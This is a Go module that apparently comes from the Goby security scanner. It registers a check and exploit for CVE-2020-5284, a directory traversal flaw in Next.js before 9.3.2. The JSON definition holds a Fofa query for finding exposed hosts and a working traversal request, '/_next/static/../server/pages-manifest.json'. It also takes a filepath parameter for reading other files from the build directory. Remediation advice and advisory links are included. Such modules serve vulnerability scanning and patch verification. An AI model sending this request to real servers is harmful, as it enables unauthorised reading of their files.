package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Next.js Directory Traversal (CVE-2020-5284)",
    "Description": "Next.js versions before 9.3.2 have a directory traversal vulnerability. Attackers could craft special requests to access files in the dist directory (.next). This does not affect files outside of the dist directory (.next). In general, the dist directory only holds build assets unless your application intentionally stores other assets under this directory. This issue is fixed in version 9.3.2.",
    "Impact": "Next.js Directory Traversal (CVE-2020-5284)",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system. 3. At present, the manufacturer has released an upgrade patch to fix the vulnerability, the patch access link: </p><p><a href=\"https://github.com/zeit/next.js/security/advisories/GHSA-fq77-7p7r-83rj\">https://github.com/zeit/next.js/security/advisories/GHSA-fq77 -7p7r-83rj</a></p>",
    "Product": "Next.js < 9.3.2",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "Next.js 目录穿越漏洞",
            "Description": "ZEIT Next.js是ZEIT公司的一款基于Vue.js、Node.js、Webpack和Babel.js的开源Web应用框架。\nZEIT Next.js 9.3.2之前版本中存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。",
            "Impact": "<p>攻击者通过访问网站某一目录时，该目录没有默认首页文件或没有正确设置默认首页文件，将会把整个目录结构列出来，将网站结构完全暴露给攻击者； 攻击者可能通过浏览目录结构，访问到某些隐秘文件（如PHPINFO文件、服务器探针文件、网站管理员后台访问地址、数据库连接文件等）。</p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br></p><p>2、如非必要，禁止公网访问该系统。<br>3、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：</p><p style=\"text-align: start;\"><a target=\"_Blank\" href=\"https://github.com/zeit/next.js/security/advisories/GHSA-fq77-7p7r-83rj\">https://github.com/zeit/next.js/security/advisories/GHSA-fq77-7p7r-83rj</a></p>",
            "Product": "Next.js < 9.3.2",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Next.js Directory Traversal (CVE-2020-5284)",
            "Description": "Next.js versions before 9.3.2 have a directory traversal vulnerability. Attackers could craft special requests to access files in the dist directory (.next). This does not affect files outside of the dist directory (.next). In general, the dist directory only holds build assets unless your application intentionally stores other assets under this directory. This issue is fixed in version 9.3.2.",
            "Impact": "Next.js Directory Traversal (CVE-2020-5284)",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. <br></p><p>2. If not necessary, prohibit public network access to the system. <br>3. At present, the manufacturer has released an upgrade patch to fix the vulnerability, the patch access link: </p><p style=\"text-align: start;\"><a target=\"_Blank\" href=\"https://github.com/zeit/next.js/security/advisories/GHSA-fq77-7p7r-83rj\">https://github.com/zeit/next.js/security/advisories/GHSA-fq77 -7p7r-83rj</a></p>",
            "Product": "Next.js < 9.3.2",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "header=\"Next.js\"",
    "GobyQuery": "header=\"Next.js\"",
    "Author": "ovi3",
    "Homepage": "https://github.com/vercel/next.js",
    "DisclosureDate": "2020-03-30",
    "References": [
        "https://github.com/zeit/next.js/releases/tag/v9.3.2",
        "https://github.com/zeit/next.js/security/advisories/GHSA-fq77-7p7r-83rj",
        "https://nvd.nist.gov/vuln/detail/CVE-2020-5284",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5284"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "4.3",
    "CVEIDs": [
        "CVE-2020-5284"
    ],
    "CNVD": [
        "CNVD-2020-22200"
    ],
    "CNNVD": [
        "CNNVD-202003-1728"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": false,
                "method": "GET",
                "uri": "/_next/static/../server/pages-manifest.json"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "application/json",
                        "variable": "$head"
                    },
                    {
                        "bz": "",
                        "operation": "regex",
                        "type": "item",
                        "value": "/_app\": \".*?_app\\.js",
                        "variable": "$body"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": false,
                "method": "GET",
                "uri": "/_next/static/../server/pages-manifest.json"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "application/json",
                        "variable": "$head"
                    },
                    {
                        "bz": "",
                        "operation": "regex",
                        "type": "item",
                        "value": "/_app\": \".*?_app\\.js",
                        "variable": "$body"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "../server/pages-manifest.json",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10688"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
